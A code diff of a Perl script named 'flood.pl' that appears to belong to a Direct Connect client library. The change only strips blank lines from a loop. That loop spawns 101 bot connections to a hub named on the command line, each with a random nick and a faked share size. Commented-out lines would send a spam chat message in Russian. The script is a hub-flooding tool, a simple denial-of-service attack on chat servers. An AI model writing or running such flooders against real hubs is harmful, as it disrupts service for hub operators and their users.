@@ -29,16 +29,13 @@ print("usage: flood.pl [dchub://]host[:port] [bot_nick]\n"), exit if !$ARGV[0];
 $ARGV[0] =~ m|^(?:dchub\://)?(.+?)(?:\:(\d+))?$|;
 my @dc;
 for ( 0 .. 100 ) {
-
   #   my $dc =
   push @dc, dcppp::clihub->new(
     'host' => $1,
     ( $2 ? ( 'port' => $2 ) : () ),
     'Nick' => ( $ARGV[1] or int( rand(100000000) ) ),
-
     #   'Nick'		=>	'xxxx',
     'sharesize' => int( rand 1000000000000 ) + int( rand 100000000000 ) * int( rand 100 ),
-
     #   'log'		=>	sub {},	# no logging
     #   'min_chat_delay'	=> 0.401,
     #   'min_cmd_delay'	=> 0.401,
@@ -47,7 +44,6 @@ for ( 0 .. 100 ) {
     'description' => '',
     'M'           => 'P',
   );
-
   #print("BOT SEND all\n"),
   #  $dc->cmd('chatline', 'Доброго времени суток! Пользуясь случаем, хотим сказать вам: ВЫ Э@3Б@ЛИ СПАМИТЬ!');
   #print("BOT SEND to $_\n"),
